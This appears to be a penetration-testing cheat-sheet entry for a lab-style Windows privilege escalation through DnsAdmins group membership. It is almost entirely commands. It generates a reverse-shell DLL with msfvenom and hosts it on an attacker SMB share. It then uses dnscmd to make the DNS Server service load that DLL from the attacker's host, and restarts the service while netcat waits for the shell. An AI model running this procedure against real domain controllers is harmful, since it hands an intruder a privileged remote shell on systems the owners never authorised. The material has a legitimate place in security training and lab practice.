#### ==🔵DnsAdmins group

The `DnsAdmins` group has the ability to specify that the DNS Server service loads a plugin DLL. We create a malicious DLL that will be loaded by the DNS Server service:

make a reverse shell `.dll`
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.63 LPORT=443 -f dll -o rev.dll
```

use `impacket-smbserver` to host the DLL on our Kali machine and then load it from there.
We start a SMB server on our Kali machine to serve the `rev.dll` file:
```
sudo impacket-smbserver share .
```

We should now configure the DNS Server to load our malicious DLL and restart the DNS service.
on windows : 
run one by one :
```
dnscmd.exe /config /serverlevelplugindll \\10.10.14.63\share\rev.dll
sc.exe \\127.0.0.1 stop dns
sc.exe query dns (MAKE SURE ITS IN STOPPED STATE FIRST)
sc.exe \\127.0.0.1 start dns
sc.exe query dns (MAKE SURE ITS IN RUNNING STATE FIRST)
# <IP> HERE IS KALI IP
```

Load the malicious DLL into the DNS Server:
on windows :
```
dnscmd.exe /config /serverlevelplugindll  \\10.10.14.63\share\rev.dll
# <IP> HERE IS KALI IP
```

Stop the DNS service:
on windows :
```
sc.exe \\127.0.0.1 stop dns
```

Now, we listen on our Kali machine to catch the reverse shell using
```
nc -lvnp 443
```

Start the DNS service, and we should receive a reverse shell:
on windows :
```
sc.exe \\127.0.0.1 start dns
```
